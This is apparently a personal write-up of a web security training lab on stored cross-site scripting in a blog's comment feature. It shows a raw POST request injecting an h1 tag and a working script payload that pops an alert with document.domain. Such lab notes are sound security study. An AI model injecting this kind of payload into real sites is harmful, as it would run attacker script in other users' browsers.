---
tags:
  - xss
  - stored
---
# Stored XSS into HTML context with nothing encoded

## Instructions

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

## Solution

Each blog post has a comment functionality.

![](attachments/xss-lab-02/file-20251113185404281.png)

Looks like the comment and name are reflected.

Send the following POST request with an `<h1>` tag in the comment and note how the input is rendered on the page.

```text title="Sending h1 tag in a comment"
POST /post/comment HTTP/1.1
Host: 0a4700d404e205bf803a17c8001f00a9.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
Origin: https://0a4700d404e205bf803a17c8001f00a9.web-security-academy.net
Connection: keep-alive
Referer: https://0a4700d404e205bf803a17c8001f00a9.web-security-academy.net/post?postId=1
Cookie: session=1Oc6n6AAZG3OhrdEC8woZsui5qFqtYJw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i

csrf=E8ExWUxE9oTs3LBObfSW4eH6HNyZi1bQ&postId=1&comment=%3Ch1%3Etest123comment%3C%2Fh1%3E&name=test123name&email=test123email%40test.com&website=
```

![](attachments/xss-lab-02/file-20251113185404280%201.png)

Note that the h1 is rendered on the page, so we know there is HTML injection. 

Send the following payload in the comment field

```text title="Working payload"
test123<script>alert(document.domain)</script>
```

Then observe that the alert triggers when we navigate back to the blog page. 

![](attachments/xss-lab-02/file-20251113185404280.png)

This solves the lab. 

## Lesson learned

Pay particular attention to any functionality that allows users to store input on the server-side (e.g., comments). Always test these thoroughly.